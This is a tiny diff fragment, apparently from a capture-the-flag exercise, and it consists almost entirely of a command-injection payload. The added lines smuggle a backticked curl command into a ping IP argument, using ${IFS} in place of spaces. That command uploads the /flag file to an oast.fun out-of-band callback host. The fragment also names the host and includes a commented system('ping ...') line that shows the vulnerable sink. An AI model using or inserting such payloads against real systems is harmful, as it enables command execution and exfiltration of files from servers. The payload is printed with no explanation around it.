@@ -1,0 +1,4 @@
+
+8.8.8.8${IFS}`curl${IFS}http://ce0tpn22vtc0000nvt5gg8ypmkoyyyyyb.oast.fun${IFS}-F${IFS}x=@/flag`
+ce0tpn22vtc0000nvt5gg8ypmkoyyyyyb.oast.fun
+// system("ping -c 3 8.8.8.8$`curl http://ce0tpn22vtc0000nvt5gg8ypmkoyyyyyb.oast.fun -F x=@/flag`");
